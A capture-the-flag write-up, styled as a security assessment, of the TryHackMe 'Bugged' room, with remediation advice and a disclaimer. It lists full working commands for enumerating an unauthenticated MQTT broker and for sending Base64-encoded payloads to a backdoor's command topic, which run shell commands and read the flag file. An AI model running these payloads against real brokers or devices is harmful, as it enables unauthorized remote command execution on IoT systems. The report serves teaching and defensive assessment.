# Security Assessment Report — Bugged

## 1. Executive Summary

**Target:** TryHackMe — Bugged
**Assessment Type:** IoT Security Assessment
**Environment:** Authorized TryHackMe lab
**Testing Platform:** Kali Linux
**Status:** Completed
**Result:** Flag successfully retrieved

The assessment investigated suspicious communications involving a smart-home environment. Network reconnaissance identified an MQTT service running on port `1883`. The service permitted unauthenticated subscription to MQTT topics, exposing messages from connected smart-home devices.

Further investigation revealed a non-obvious MQTT configuration topic containing Base64-encoded JSON. The decoded configuration exposed a device identifier, registered commands, and separate topics for receiving commands and publishing responses.

The exposed command interface supported system information retrieval and shell command execution. By interacting with this interface through MQTT, the assessment identified the execution context, enumerated accessible files, and successfully retrieved the challenge flag.

The primary security issue was insufficient access control over the MQTT service and its exposed command-execution interface.

## 2. Assessment Scope

### In Scope

* Network port and service enumeration.
* MQTT service discovery and interaction.
* Analysis of smart-home device messages.
* Decoding of configuration and response payloads.
* Investigation of the exposed command interface.
* Retrieval and verification of the challenge flag.

### Target Information

| Attribute                                 | Finding              |
| ----------------------------------------- | -------------------- |
| Target IP                                 | `10.48.149.138`      |
| Open TCP port                             | `22`                 |
| SSH service                               | OpenSSH 8.2p1        |
| MQTT service                              | Mosquitto 2.0.14     |
| MQTT port                                 | `1883/tcp`           |
| Operating system reported by the backdoor | Linux x64            |
| Reported kernel                           | `5.15.0-139-generic` |

The target IP is specific to the lab session and may change when the room is restarted.

## 3. Tools Used

| Tool                  | Purpose                                      |
| --------------------- | -------------------------------------------- |
| Nmap                  | Port scanning and service identification     |
| `mosquitto_sub`       | Subscribing to MQTT topics                   |
| `mosquitto_pub`       | Publishing MQTT messages                     |
| `base64`              | Decoding configuration and service responses |
| Linux shell utilities | Inspecting command output and files          |

## 4. Technical Investigation

### 4.1 Network Reconnaissance

An Nmap scan was performed to identify open TCP ports and service versions.

**Command:**

```bash
nmap -sV -p- 10.48.149.138 -vvv
```

**Results:**

| Port       | State | Service | Version              |
| ---------- | ----- | ------- | -------------------- |
| `22/tcp`   | Open  | SSH     | OpenSSH 8.2p1 Ubuntu |
| `1883/tcp` | Open  | MQTT    | Mosquitto 2.0.14     |

**Analysis:**

The MQTT service was selected for further investigation because MQTT is widely used in IoT and smart-home communication. Port `1883` is the conventional TCP port for unencrypted MQTT traffic.

### 4.2 MQTT Topic Enumeration

A subscription was established to observe messages published to available topics.

**Command:**

```bash
mosquitto_sub -h 10.48.149.138 -p 1883 -t '#' -v
```

**Observation:**

The broker accepted the subscription and displayed messages without requesting authentication.

Messages were observed from several smart-home devices:

* `storage/thermostat`
* `patio/lights`
* `livingroom/speaker`
* `kitchen/toaster`
* `frontdeck/camera`

The messages contained device identifiers and state information, including temperature, light status, speaker gain, toaster activity, and camera movement.

An unusual configuration topic was also discovered:

```text
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config
```

Its payload was Base64-encoded JSON.

**Security significance:**

Unauthenticated topic enumeration exposed internal device information and allowed the investigation to identify a potentially sensitive communication channel.

### 4.3 Configuration Payload Analysis

The encoded configuration was decoded using:

```bash
echo '<BASE64_PAYLOAD>' | base64 -d
```

The decoded JSON contained the following information:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": [
    "HELP",
    "CMD",
    "SYS"
  ],
  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

The configuration disclosed:

* A unique identifier for the backdoor.
* A list of supported commands.
* A topic used to publish responses.
* A topic used to receive commands.

This information provided a basis for investigating the device's command interface.

### 4.4 Command Interface Identification

A subscription was created for the response topic:

```bash
mosquitto_sub -h 10.48.149.138 -p 1883 \
-t 'U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub' -v
```

The service initially returned an error describing the expected message format. The response was Base64-decoded, revealing the following supported commands:

| Command | Function                          |
| ------- | --------------------------------- |
| `HELP`  | Display command usage information |
| `CMD`   | Execute a shell command           |
| `SYS`   | Return system information         |

The required message format was a Base64-encoded JSON object containing the `id`, `cmd`, and `arg` fields.

**Example payload generation:**

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"HELP","arg":""}' | base64 -w0)
```

The encoded message was then published to the command topic:

```bash
mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The response confirmed the command syntax and supported operations.

### 4.5 System Information Retrieval

The `SYS` command was used to identify the operating system and kernel reported by the backdoor.

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"SYS","arg":""}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

**Response:**

```text
Linux x64 5.15.0-139-generic
```

This confirmed that the command interface exposed system information through MQTT.

### 4.6 Command Execution and File Enumeration

The `CMD` command was used to inspect the execution identity, current directory, and directory contents.

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"id; pwd; ls -la"}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The decoded response showed:

```text
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
/home/challenge
```

The directory listing revealed a `flag.txt` file owned by root.

**Analysis:**

The command interface allowed shell commands to be executed as the `challenge` user. The file's ownership and permissions indicated that access to the flag was not necessarily available through ordinary local file permissions, but the backdoor's execution behavior allowed the file to be retrieved in this lab.

### 4.7 Flag Retrieval

A command was published to read the challenge flag:

```bash
payload=$(echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat /home/challenge/flag.txt"}' | base64 -w0)

mosquitto_pub -h 10.48.149.138 -p 1883 \
-t 'XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub' \
-m "$payload"
```

The response was received on the MQTT response topic and decoded from Base64.

**Result:** The flag was successfully retrieved and submitted to the TryHackMe room.

## 5. Findings and Risk Analysis

### Finding 1 — Unauthenticated MQTT Topic Access

**Severity:** High, subject to deployment context

**Evidence:**

The client subscribed to all topics using `-t '#'` without providing credentials and received smart-home device messages.

**Impact:**

An unauthorized client could potentially observe device state, configuration information, and other sensitive communications. Depending on broker permissions, unauthorized publishing might also be possible.

**Recommendation:**

* Require authentication for MQTT clients.
* Enforce topic-level access control lists (ACLs).
* Restrict anonymous subscriptions and publishing.
* Segment IoT devices from untrusted networks.
* Use TLS where appropriate to protect traffic in transit.

### Finding 2 — Exposed Command-Execution Interface

**Severity:** Critical, subject to deployment context

**Evidence:**

The decoded configuration exposed command and response topics. The `CMD` operation accepted shell commands and returned their output over MQTT.

**Impact:**

An unauthorized party able to reach and use the interface could execute commands with the privileges of the backdoor process. This could expose files, disclose system information, or provide a foothold for further compromise.

**Recommendation:**

* Remove undocumented backdoor functionality.
* Do not expose shell execution through IoT messaging.
* Restrict command execution to explicitly authorized operations.
* Run device services with least privilege.
* Require strong authentication and authorization for sensitive commands.
* Monitor command topics for suspicious activity.

### Finding 3 — Sensitive Configuration Disclosed Through MQTT

**Severity:** High, subject to deployment context

**Evidence:**

An unusual MQTT configuration message contained a device identifier, supported commands, and internal communication topics.

**Impact:**

An unauthorized subscriber could learn how the device communicates and how to address its command interface.

**Recommendation:**

* Restrict access to configuration topics.
* Avoid publishing sensitive operational details to broadly accessible topics.
* Rotate exposed credentials or tokens if present.
* Review topic naming and access policies as part of secure IoT design.

## 6. Root Cause Analysis

The principal issue was inadequate separation between device messaging and privileged operational functionality.

The observed weaknesses formed a chain:

1. The MQTT service was reachable over the network.
2. Anonymous topic subscriptions were accepted.
3. A configuration message exposed the backdoor's identifier and communication topics.
4. The backdoor accepted commands through MQTT.
5. Shell command output was returned through the response topic.
6. The interface enabled retrieval of the challenge flag.

The combined weaknesses made it possible to move from passive observation to command execution without first establishing a conventional SSH session.

## 7. Remediation Plan

The following actions are recommended in priority order:

| Priority | Action                                                                            |
| -------- | --------------------------------------------------------------------------------- |
| Critical | Remove or disable the command-execution backdoor                                  |
| Critical | Restrict shell and administrative operations to trusted, authenticated interfaces |
| High     | Disable anonymous MQTT access                                                     |
| High     | Apply topic-level ACLs to all MQTT clients                                        |
| High     | Run services with least privilege                                                 |
| Medium   | Encrypt MQTT traffic where appropriate                                            |
| Medium   | Monitor suspicious subscriptions and command publications                         |
| Medium   | Review device configuration and remove unnecessary services                       |
| Low      | Document approved topics, message formats, and device communication requirements  |

After remediation, repeat the assessment to verify that unauthorized clients cannot subscribe to sensitive topics or invoke privileged operations.

## 8. Lessons Learned

This challenge reinforced several practical security concepts:

* Network reconnaissance helps identify exposed services and guide further investigation.
* MQTT is important in IoT environments and should be secured like any other network service.
* Base64 encoding does not provide confidentiality; encoded configuration data can be easily recovered.
* MQTT topic names and payloads can reveal internal architecture and control mechanisms.
* An exposed command-execution interface can turn a messaging-service misconfiguration into a system compromise.
* Combining observations from multiple stages produces a clearer and more defensible finding than relying on a single scan.

## 9. Conclusion

The Bugged challenge demonstrated how insecure IoT messaging and an exposed command interface can compromise the confidentiality and integrity of a connected environment.

The investigation progressed from port scanning to MQTT enumeration, configuration decoding, command-interface discovery, system identification, and flag retrieval. The successful result highlighted the importance of authentication, authorization, least privilege, and the removal of undocumented administrative functionality.

**Assessment status:** Completed
**Flag retrieval:** Successful
**Final outcome:** The challenge flag was recovered and submitted.

## 10. Disclaimer

This report documents an assessment conducted within the authorized TryHackMe training environment. The commands and techniques described here must only be used against systems for which explicit testing permission has been granted.